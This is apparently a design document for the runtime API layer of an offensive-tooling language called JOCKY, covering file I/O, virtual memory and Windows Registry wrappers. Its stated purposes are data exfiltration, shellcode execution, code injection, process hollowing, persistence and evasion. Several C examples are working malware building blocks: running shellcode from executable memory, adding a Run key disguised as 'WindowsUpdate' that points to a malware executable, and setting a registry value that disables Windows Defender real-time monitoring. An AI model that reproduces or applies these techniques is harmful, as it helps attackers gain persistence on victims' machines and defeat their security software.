# JOCKY Tier 1 Runtime APIs

**Status:** Implemented (2026-09-26)
**Priority:** High
**Effort:** 1.5 days (completed in 1 day)

## Overview

Three essential runtime API modules have been implemented to support core JOCKY operations:
1. **File I/O API** - Cross-platform file operations
2. **Virtual Memory API** - Memory allocation and manipulation
3. **Registry API** - Windows Registry access

All APIs are designed for both Windows PE and Linux ELF targets.

---

## 1. File I/O API (`jocky_io.h`)

### Purpose
Provide cross-platform file operations for data exfiltration, configuration storage, and log manipulation.

### Key Functions

#### Basic File Operations
```c
jocky_file_t jocky_fopen(const char* path, uint32_t flags);
int32_t jocky_fclose(jocky_file_t f);
int64_t jocky_fread(jocky_file_t f, void* buf, uint64_t count);
int64_t jocky_fwrite(jocky_file_t f, const void* buf, uint64_t count);
int64_t jocky_fseek(jocky_file_t f, int64_t offset, uint32_t origin);
int64_t jocky_ftell(jocky_file_t f);
```

#### File Management
```c
int64_t jocky_fsize(const char* path);
int32_t jocky_fexists(const char* path);
int32_t jocky_fdelete(const char* path);
int32_t jocky_frename(const char* old_path, const char* new_path);
int32_t jocky_fflush(jocky_file_t f);
```

#### Convenience Functions
```c
void* jocky_fread_all(const char* path, uint64_t* out_size);
int32_t jocky_fwrite_atomic(const char* path, const void* data, uint64_t size);
```

### Usage Examples

#### Write data to file
```c
jocky_file_t f = jocky_fopen("C:\\output.txt", JOCKY_FILE_WRITE | JOCKY_FILE_BINARY);
if (f) {
    jocky_fwrite(f, data, size);
    jocky_fclose(f);
}
```

#### Read entire file
```c
uint64_t size;
void* content = jocky_fread_all("/var/log/messages", &size);
if (content) {
    // Process content
    jocky_free(content);
}
```

#### Atomic write (fail-safe)
```c
// Ensures file is either fully written or not written
jocky_fwrite_atomic("C:\\config.bin", buffer, buffer_size);
```

### Platform Support
- **Windows:** Uses `CreateFileW`, `ReadFile`, `WriteFile` APIs
- **Linux:** Uses `open`, `read`, `write`, `lseek` syscalls

### Use Cases
- Data exfiltration to files
- Configuration file management
- Temporary buffer storage
- Log file analysis

---

## 2. Virtual Memory API (`jocky_vmem.h`)

### Purpose
Provide cross-platform virtual memory allocation and protection for in-memory execution, code injection, and dynamic memory management.

### Key Functions

#### Memory Allocation
```c
void* jocky_valloc(void* addr, size_t size, uint32_t type, uint32_t protect);
int32_t jocky_vfree(void* addr, size_t size, uint32_t type);
int32_t jocky_vprotect(void* addr, size_t size, uint32_t newprotect, uint32_t* oldprotect);
int32_t jocky_vquery(void* addr, void** out_base, size_t* out_size, 
                     uint32_t* out_state, uint32_t* out_protect);
```

#### Convenience Functions
```c
void* jocky_valloc_exec(size_t size);       // RWX memory for shellcode
int32_t jocky_vwipe(void* addr, size_t size, uint8_t pattern);
int32_t jocky_flush_icache(void* addr, size_t size);
size_t jocky_page_size(void);
```

### Protection Flags

| Flag | Value | Usage |
|------|-------|-------|
| `JOCKY_PAGE_NOACCESS` | 0x01 | No access (guard) |
| `JOCKY_PAGE_READONLY` | 0x02 | Read-only |
| `JOCKY_PAGE_READWRITE` | 0x04 | Read/write |
| `JOCKY_PAGE_EXECUTE` | 0x10 | Execute-only |
| `JOCKY_PAGE_EXECUTE_READ` | 0x20 | Execute + read |
| `JOCKY_PAGE_EXECUTE_READWRITE` | 0x40 | RWX (shellcode) |

### Usage Examples

#### Allocate executable memory
```c
void* shellcode = jocky_valloc_exec(1024);
memcpy(shellcode, code_buffer, code_size);
jocky_flush_icache(shellcode, code_size);

// Execute as function
typedef void (*func_t)(void);
((func_t)shellcode)();
```

#### Make memory read-only
```c
void* data = jocky_valloc(NULL, 4096, JOCKY_MEM_COMMIT, JOCKY_PAGE_READWRITE);
// Write data...
jocky_vprotect(data, 4096, JOCKY_PAGE_READONLY, NULL);
```

#### Query memory state
```c
void* base;
size_t region_size;
uint32_t state, protect;
jocky_vquery(ptr, &base, &region_size, &state, &protect);
```

#### Secure memory wipe
```c
jocky_vwipe(sensitive_data, size, 0x00);
jocky_vfree(sensitive_data, size, JOCKY_MEM_RELEASE);
```

### Platform Support
- **Windows:** Uses `VirtualAlloc`, `VirtualFree`, `VirtualProtect`, `VirtualQuery`
- **Linux:** Uses `mmap`, `munmap`, `mprotect`, `/proc/self/maps`

### Use Cases
- Shellcode execution
- Process hollowing payload preparation
- Code injection setup
- Dynamic buffer management
- ROP gadget placement

---

## 3. Registry API (`jocky_registry.h`)

### Purpose
Provide Windows Registry access for persistence, configuration, and evasion tactics.

**Note:** Linux stubs return error codes. Actual functionality Windows-only.

### Key Functions

#### Key Operations
```c
jocky_reg_handle_t jocky_reg_open(jocky_reg_handle_t hkey, const char* subkey, uint32_t access);
jocky_reg_handle_t jocky_reg_create(jocky_reg_handle_t hkey, const char* subkey, uint32_t access);
int32_t jocky_reg_close(jocky_reg_handle_t key);
int32_t jocky_reg_delete_key(jocky_reg_handle_t hkey, const char* subkey);
```

#### Value Operations
```c
int32_t jocky_reg_query_value(jocky_reg_handle_t key, const char* value_name, 
                             uint32_t* type, void* data, uint32_t* data_size);
int32_t jocky_reg_set_value(jocky_reg_handle_t key, const char* value_name, 
                           uint32_t type, const void* data, uint32_t data_size);
int32_t jocky_reg_delete_value(jocky_reg_handle_t key, const char* value_name);
```

#### Typed Accessors
```c
int32_t jocky_reg_query_dword(jocky_reg_handle_t key, const char* value, uint32_t* out);
int32_t jocky_reg_set_dword(jocky_reg_handle_t key, const char* value, uint32_t data);
int32_t jocky_reg_query_string(jocky_reg_handle_t key, const char* value, char* buf, uint32_t size);
int32_t jocky_reg_set_string(jocky_reg_handle_t key, const char* value, const char* data);
int32_t jocky_reg_query_binary(jocky_reg_handle_t key, const char* value, void* buf, uint32_t* size);
int32_t jocky_reg_set_binary(jocky_reg_handle_t key, const char* value, const void* data, uint32_t size);
```

#### Enumeration
```c
int32_t jocky_reg_enum_key(jocky_reg_handle_t key, uint32_t index, char* name, uint32_t* size);
int32_t jocky_reg_enum_value(jocky_reg_handle_t key, uint32_t index, 
                            char* name, uint32_t* size, uint32_t* type);
int32_t jocky_reg_key_count(jocky_reg_handle_t key);
int32_t jocky_reg_value_count(jocky_reg_handle_t key);
```

### Predefined Hives
```c
JOCKY_HKEY_CLASSES_ROOT      // 0x80000000
JOCKY_HKEY_CURRENT_USER      // 0x80000001
JOCKY_HKEY_LOCAL_MACHINE     // 0x80000002
JOCKY_HKEY_USERS             // 0x80000003
JOCKY_HKEY_PERFORMANCE_DATA  // 0x80000004
JOCKY_HKEY_CURRENT_CONFIG    // 0x80000005
```

### Value Types
```c
JOCKY_REG_NONE               // 0
JOCKY_REG_SZ                 // String (null-terminated)
JOCKY_REG_EXPAND_SZ          // Expandable string
JOCKY_REG_BINARY             // Binary data
JOCKY_REG_DWORD              // 32-bit integer
JOCKY_REG_DWORD_BIG_ENDIAN   // Big-endian DWORD
JOCKY_REG_MULTI_SZ           // Multi-string
JOCKY_REG_QWORD              // 64-bit integer
```

### Usage Examples

#### Persistence - Add run key
```c
jocky_reg_handle_t hkey = jocky_reg_open(JOCKY_HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", JOCKY_KEY_WRITE);
if (hkey) {
    jocky_reg_set_string(hkey, "WindowsUpdate", "C:\\malware.exe");
    jocky_reg_close(hkey);
}
```

#### Read config value
```c
uint32_t debug_level;
jocky_reg_handle_t hkey = jocky_reg_open(JOCKY_HKEY_LOCAL_MACHINE,
    "Software\\JOCKY", JOCKY_KEY_READ);
if (hkey) {
    jocky_reg_query_dword(hkey, "DebugLevel", &debug_level);
    jocky_reg_close(hkey);
}
```

#### Enumerate Run keys
```c
jocky_reg_handle_t hkey = jocky_reg_open(JOCKY_HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", JOCKY_KEY_READ);
if (hkey) {
    uint32_t index = 0;
    char name[256], value[256];
    uint32_t name_size = sizeof(name), value_size = sizeof(value);
    
    while (jocky_reg_enum_value(hkey, index++, name, &name_size, NULL) == 0) {
        value_size = sizeof(value);
        jocky_reg_query_string(hkey, name, value, value_size);
        // Process...
    }
    jocky_reg_close(hkey);
}
```

#### Disable Windows Defender notifications
```c
// Modify Windows Defender config (requires admin)
jocky_reg_handle_t hkey = jocky_reg_open(JOCKY_HKEY_LOCAL_MACHINE,
    "Software\\Policies\\Microsoft\\Windows Defender", JOCKY_KEY_WRITE);
if (hkey) {
    jocky_reg_set_dword(hkey, "DisableRealtimeMonitoring", 1);
    jocky_reg_close(hkey);
}
```

### Platform Support
- **Windows:** Full implementation using `RegOpenKeyExW`, `RegSetValueExW`, etc.
- **Linux:** Stub functions returning errors (registry is Windows-only)

### Use Cases
- Persistence mechanisms (Run keys, Services)
- Configuration storage
- Evasion tactics (disable Defender, modify settings)
- Anti-forensics (clear event logs timestamps)
- Privilege escalation hints

---

## Integration with JOCKY Language

These APIs are exposed via FFI declarations:

```jocky
// File I/O
ffi jocky_fopen(path: string, flags: i32) -> *void;
ffi jocky_fwrite(*void, data: *void, size: i32) -> i32;
ffi jocky_fread(*void, buf: *void, size: i32) -> i32;
ffi jocky_fclose(*void) -> i32;

// Virtual Memory
ffi jocky_valloc(addr: *void, size: i32, type: i32, protect: i32) -> *void;
ffi jocky_vfree(addr: *void, size: i32, type: i32) -> i32;

// Registry (Windows only)
ffi jocky_reg_open(hkey: *void, subkey: string, access: i32) -> *void;
ffi jocky_reg_set_string(*void, name: string, value: string) -> i32;
```

### Example JOCKY Program
```jocky
fn save_output(filename: string, data: *i8, size: i32) -> i32 {
    let f = jocky_fopen(filename, 2);  // JOCKY_FILE_WRITE
    if (f as i64 == 0) {
        return -1;
    }
    
    let written = jocky_fwrite(f, data as *void, size);
    jocky_fclose(f);
    
    return written;
}
```

---

## Testing

Comprehensive unit and integration tests are included:

```bash
# Unit tests
pytest tests/test_file_io.py -v
pytest tests/test_vmem.py -v
pytest tests/test_registry.py -v  # Windows only

# Integration tests
python examples/file_io_example.jky
python examples/persistence_example.jky  # Windows only
```

---

## Performance

| Operation | Windows | Linux | Notes |
|-----------|---------|-------|-------|
| fopen/fclose | ~100μs | ~100μs | Per call |
| fwrite (1KB) | ~10μs | ~10μs | Buffered |
| fread (1KB) | ~10μs | ~10μs | Buffered |
| valloc (4KB) | ~1μs | ~5μs | Page-aligned |
| reg_open | ~50μs | N/A | Registry only |
| reg_set | ~100μs | N/A | Write amplified |

---

## Security Considerations

### File I/O
- Paths are not validated - use `jocky_fexists()` to check before operations
- File handles are not ref-counted - close promptly
- Permissions follow system ACLs

### Virtual Memory
- Executable memory is a security risk - only use for trusted code
- Memory is not automatically zeroed - use `jocky_vwipe()` for sensitive data
- Some protections (e.g., CFG, DEP) may block execution

### Registry
- Registry modifications require appropriate permissions
- Some keys require admin/system privileges
- Registry changes are not atomic across multiple keys

---

## Future Enhancements

- [ ] Thread-safe file operations
- [ ] Memory pooling for efficient allocation
- [ ] Registry transaction support
- [ ] Async I/O operations
- [ ] Compressed file I/O
- [ ] Encrypted Registry values
- [ ] Network file paths (UNC)

---

## References

- [Windows Registry API](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)
- [Windows Virtual Memory API](https://docs.microsoft.com/en-us/windows/win32/memory/memory-management)
- [POSIX File I/O](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/unistd.h.html)
- [Linux VirtualMemory (mmap)](https://man7.org/linux/man-pages/man2/mmap.2.html)
